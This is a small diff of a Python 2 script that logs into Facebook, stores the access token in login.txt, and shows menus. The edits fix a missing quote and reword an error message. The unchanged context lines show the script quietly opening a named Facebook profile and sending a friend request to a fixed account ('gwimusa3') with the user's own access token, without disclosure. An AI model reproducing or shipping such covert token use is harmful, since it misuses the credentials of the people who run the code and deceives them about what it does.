@@ -159,7 +159,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://www.facebook.com/pankaj.panku.35
+				os.system('xdg-open https://www.facebook.com/pankaj.panku.35')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -194,7 +194,7 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		print"\033[1;91mYour Account is on Checkpoint"
+		print"\033[1;91mYour Account is on login"
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
